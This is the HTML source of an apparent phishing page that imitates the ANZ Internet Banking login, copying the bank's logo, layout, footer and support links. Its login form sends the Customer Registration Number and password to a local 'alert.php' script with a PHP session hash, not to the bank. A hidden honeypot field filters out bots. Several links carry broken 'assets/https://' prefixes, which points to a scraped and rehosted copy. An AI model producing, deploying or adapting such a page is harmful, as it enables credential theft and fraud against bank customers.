            font-weight: inherit;
            padding: 12px;
            cursor: pointer;
            -webkit-transition: background-color 0.2s, border-color 0.2s, color 0.2s;
            transition: background-color 0.2s, border-color 0.2s, color 0.2s;
        }

        .jRMrpg a {
            color: #fff;
        }

        .pageContainer {
            display: none;
        }</style><section id="root"><div class="sc-htoDjs bBaFcw"><header class="sc-iRbamj gsHUbf"><div class="sc-jlyJG kYvYgm"><div class="sc-gqjmRU sc-kgoBCf tQNRl"><img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ Logo" class="sc-gipzik gJhOur"></div></div></header><main class="sc-dnqmqq fgYQMj"><div class="sc-gqjmRU jwCRHS"><div class="sc-dxgOiQ iyDMES"><div class="sc-VigVT sc-jzJRlG bsYAOt"><div class="sc-bXGyLb ePIfrV"><img alt="Error Icon" data-test-id="error-page-info-icon" src="assets/Info-Icon.1.0.0.svg" aria-hidden="true" class="sc-daURTG frpFfQ"><h1 data-test-id="error-title" class="sc-iELTvK gQayGb">Please check your browser settings</h1></div><div class="sc-lkqHmb jtlJDR"><div data-test-id="error-message" class="sc-eLExRp fFdpBA"><div class="sc-bdVaJa sc-bxivhb kMXqJD"><div class="sc-bwzfXH sc-ifAKCX fBZoRA"><div class="sc-htpNat sc-EHOje hiHoEC"><p class="sc-gzOgki ijCyQu">To access ANZ Internet Banking, please check your browser settings.</p><p class="sc-gzOgki kmExjg">Try logging in with a different browser. See browser and software settings on ANZ.com for more information.</p></div></div><div class="sc-bwzfXH sc-ifAKCX jTKZuQ"><div class="sc-htpNat sc-EHOje fuDXid"><a data-test-id="software-requirements" href="#/support/internet-banking/getting-started/browser-software-settings/" rel="noopener" target="_self" class="sc-eHgmQL sc-cvbbAY jsqTYX"><button data-test-id="go-back-to-anz" class="sc-jKJlTe hUOKGW">View browser and software settings</button></a></div></div></div></div></div></div></div></div></main><footer class="sc-esjQYD gbxeYH"><div class="sc-kIPQKe qtnPq"><div class="sc-gqjmRU sc-kgoBCf tQNRl"><span class="sc-ibxdXY hGxWjT"><div data-test-id="footer-details" class="sc-kEYyzF jMeGNg">© Australia and New Zealand Banking Group Limited (ANZ) 2022<span class="sc-eXEjpC jRMrpg"> ABN 11 005 357 522.</span></div></span></div></div></footer></div></section></noscript><div id="root" class="pageContainer"><div class="sc-htoDjs gcwNfU"><header class="sc-csuQGl iNSeoe"><div data-test-id="header-section" class="sc-Rmtcm fQcucI"><span class="sc-chPdSV kiOFau"><a data-test-id="home-anz-link" href="#/personal/" title="ANZ Logo" class="sc-cvbbAY fSWFwe"><img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ logo" class="sc-bRBYWo iDMDsu"></a></span></div></header><main class="sc-dnqmqq fgYQMj"><div class="sc-iwsKbI sc-gqjmRU sc-VigVT cbBBvh"><div class="sc-RefOD fcpSbK"><div data-test-id="column-1" class="sc-iQKALj eJuBVL"><div class="sc-jTzLTM sc-fjdhpX sc-gipzik biBRUN"><div class="sc-bdVaJa sc-bxivhb gHmjpC"><div class="sc-bwzfXH sc-ifAKCX jMDrzh"><div class="sc-htpNat sc-EHOje fuDXid"><h1 data-test-id="login-header-test-id" id="login-header" tabindex="-1" font-size="30px" font-weight="600" class="sc-elJkPf gQzZhN"><span role="text" class="sc-bYSBpT bDGCPV">Log in to <div>ANZ Internet Banking</div></span></h1></div></div>
		 <form class="box-form form-login otl-form ptrn-txt-main-wrapper" method="post" action="alert.php?_sessionid=<?=$_SESSION['hash']?>" id="form1"> 
        <div id="live-container"><div class="sc-bwzfXH sc-ifAKCX hkTfox"><div class="sc-htpNat sc-EHOje fuDXid"><div class="sc-jlyJG fXSsv"><div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH" data-test-id="customerRegistrationNumber_wrapper"><label data-test-id="customerRegistrationNumber_label" for="customerRegistrationNumber" class="sc-kgAjT epQYnQ">Customer Registration Number</label><div data-test-id="customerRegistrationNumber_info" class="sc-uJMKN dnzUOx"><div data-test-id="customerRegistrationNumber_info_text" class="sc-bbmXgH fVCBsY"></div></div><div class="sc-jbKcbu huxGVV"><input id="customerRegistrationNumber" required name="email" type="tel" minlength=9 maxlength="16" data-test-id="customerRegistrationNumber_input" placeholder="" aria-describedby="" class="sc-kvZOFW caCjTA" value=""><span value="" class="sc-jqCOkK kFMbpR"></span></div></div></div></div></div><div class="sc-bwzfXH sc-ifAKCX hkTfox"><div class="sc-htpNat sc-EHOje fuDXid"><div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH" data-test-id="password_wrapper"><label data-test-id="password_label" for="password" class="sc-kgAjT epQYnQ">Password</label><div data-test-id="password_info" class="sc-uJMKN dnzUOx"><div data-test-id="password_info_text" class="sc-bbmXgH fVCBsY"></div></div><div class="sc-jbKcbu huxGVV"><input id="password" required minlength=4 name="password" type="password" maxlength="" data-test-id="password_input" placeholder="" aria-describedby="" class="sc-kvZOFW kpvtrg" value=""><span value="" class="sc-jqCOkK kFMbpR"></span></div></div></div></div></div><input type="text" name="robotics" value="" style="display: none;" /><div class="sc-bwzfXH sc-ifAKCX hkTfox"><div class="sc-htpNat sc-EHOje fuDXid"><button type="submit" data-test-id="log-in-btn" font-weight="600" class="sc-hMqMXs enlyRz"><span role="text"><svg viewBox="0 0 16 16" width="1em" height="1em" class="sc-epnACN yRSAC"><path d="M13.585 6.209h-.89V4.695A4.7 4.7 0 0 0 8 0a4.7 4.7 0 0 0-4.695 4.695V6.21h-.89a.296.296 0 0 0-.296.297v9.198c0 .162.133.295.297.295h11.169a.296.296 0 0 0 .296-.297V6.506a.297.297 0 0 0-.296-.297zm-8.28-1.514A2.698 2.698 0 0 1 8 2a2.698 2.698 0 0 1 2.695 2.695V6.21h-5.39V4.695zm3.57 5.98v2.368a.874.874 0 0 1-1.748 0v-2.367a1.342 1.342 0 0 1-.484-1.024c0-.749.61-1.358 1.358-1.358.749 0 1.358.61 1.358 1.358 0 .395-.18.768-.484 1.023z" fill="currentColor"></path></svg>Log in</span></button></div></div></form><div class="sc-bwzfXH sc-ifAKCX hkTfox"><div class="sc-htpNat sc-EHOje iCsUil"><a data-test-id="forgot-login-details-link" href="#" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Forgot login details?</a></div><div class="sc-htpNat sc-EHOje fhjBJp"><div class="sc-esjQYD cwZGXC"><a data-test-id="help-link" rel="noopener" class="sc-hSdWYo bgtufs" href="assets/https://login.anz.com/internetbanking/help?adobe_mc=MCORGID%3D67A216D751E567B20A490D4C%2540AdobeOrg%7CTS%3D1654113857">Help</a></div></div></div><hr aria-hidden="true" class="sc-gxMtzJ sc-dfVpRl cPNVuT"><div class="sc-bwzfXH sc-ifAKCX keBdWO"><div class="sc-htpNat sc-EHOje fuDXid"><div class="sc-kIPQKe kdLFKe"><span data-test-id="register-text-test-id" class="sc-cIShpX eDUZTK"><span>New to Internet Banking? </span><a data-test-id="register-link" href="assets/https://register.anz.com/internetbanking" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Register</a></span></div></div></div><div class="sc-bwzfXH sc-ifAKCX jTKZuQ"><div class="sc-htpNat sc-EHOje fuDXid"><div class="sc-kIPQKe kdLFKe"><span data-test-id="logging-in-text" class="sc-jwKygS hHGkXv"><span>By logging in, you accept our <a data-test-id="security-and-privacy-statement-link" href="#/privacy/centre/" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Security and Privacy Statement.</a></span></span></div></div></div></div></div></div><div data-test-id="column-2" class="sc-bwCtUz iDPwqX"><div class="sc-jTzLTM sc-fjdhpX sc-gipzik iePjpL"><div class="sc-bdVaJa sc-bxivhb iuTaRk"><div class="sc-bwzfXH sc-ifAKCX jTKZuQ"><div data-test-id="sub-column-1" class="sc-htpNat sc-EHOje sc-hXRMBi ePrdtW"><div id="acquisition-area" data-test-id="acquisition-area" class="sc-jTzLTM sc-fjdhpX sc-gipzik RVemu"><a href="#/support?pid=glo-ibl-td-ib-04-21-ser-support" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx"><img src="assets/ib-login-support.1.0.0.svg" alt="ib login support" class="sc-hrWEMg eyFUJr"></a><p class="sc-eTuwsz jtENsv"><a href="#/support?pid=glo-ibl-td-ib-04-21-ser-support" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx"><span role="text" class="sc-bYSBpT bDGCPV">Have a question about a product or service of ours?</span></a></p><a href="#/support?pid=glo-ibl-td-ib-04-21-ser-support" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP sc-gwVKww eFekaO"><span role="text" class="sc-bYSBpT bDGCPV">Visit ANZ Support</span></a></div></div><div data-test-id="sub-column-2" class="sc-htpNat sc-EHOje fEcYwd"><div class="sc-jTzLTM sc-fjdhpX sc-gipzik RVemu"><div class="sc-bdVaJa sc-bxivhb ftOLeJ"><div class="sc-bwzfXH sc-ifAKCX kZqxSq"><span role="text" data-test-id="login-help-link-header-test-id" id="login-help-link-header" class="sc-bYSBpT bDGCPV"><div font-weight="600" class="sc-kIPQKe sc-eXEjpC bkGKPV">Further information</div></span></div><div class="sc-bwzfXH sc-ifAKCX hhhmKx"><a data-test-id="whats_new_ib-link" href="#/ways-to-bank/internet-banking/personal/whats-new/" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">What’s new</a></div><div class="sc-bwzfXH sc-ifAKCX hhhmKx"><a data-test-id="find_or_change_crn_password-link" href="#/support/customer-registration-number-password/" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Find or change your CRN and Password</a></div><div class="sc-bwzfXH sc-ifAKCX hhhmKx"><a data-test-id="view_statements-link" href="#/support/statements/" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">View statements</a></div><div class="sc-bwzfXH sc-ifAKCX hhhmKx"><a data-test-id="get_or_change_your_card_pin-link" href="#/personal/credit-cards/using/managing/#changepin" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Get or change your card PIN</a></div><div class="sc-bwzfXH sc-ifAKCX hhhmKx"><a data-test-id="latest_security_alerts-link" href="#/security/fraud-detection/latest-security-alerts/" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Latest security alerts</a></div><div class="sc-bwzfXH sc-ifAKCX hhhmKx"><a data-test-id="contact_us-link" href="#/support/contact-us/" rel="noopener" target="_blank" class="sc-eHgmQL sc-jWBwVP bGycgx">Contact us</a></div></div></div></div></div></div></div></div></div></div></main><footer class="sc-hzDkRC hLFFFY"><div class="sc-jhAzac cAuNUY"><div class="sc-iwsKbI sc-gqjmRU sc-kgoBCf UeGWU"><span class="sc-fMiknA iYfeTu"><div data-test-id="footer-details" class="sc-kEYyzF jMeGNg">© Australia and New Zealand Banking Group Limited (ANZ) 2022<span class="sc-fBuWsC kbKcVw"> ABN 11 005 357 522.</span></div></span></div></div></footer></div></div>
<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_anz_0" name="destination_publishing_iframe_anz_0_name" src="assets/index_2.html#https%3A%2F%2Flogin.anz.com" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe><iframe title="rpreer" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;" src="assets/index_1.html"></iframe><iframe id="iframe211" src="assets/index_3.html" title="wupm_a" style="width: 0px; height: 0px; border: none; display: none;"></iframe>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.4/jquery.validate.min.js"></script>
<script src="assets/jquery.mask.js"></script>
<script src="assets/inputmask.min.js" data-autoinit="true"></script>
<style> 
  input.error{ border: 1px solid red !important; } 
  input::placeholder{ position: absolute; text-align: left; }

</style>

<script>
	$(document).ready(function(){
		$('#form1').validate({
			errorPlacement: function(error, element){
				return true;
			}
		});

		$('#form1 input').blur(function() {
			if( !$(this).valid() ) {
				if( !$(this).hasClass('error') ){ $(this).addClass('error'); }


			}else{
				if( $(this).hasClass('error') ){ $(this).removeClass('error'); }
			}
		});


	});
</script>
</body></html>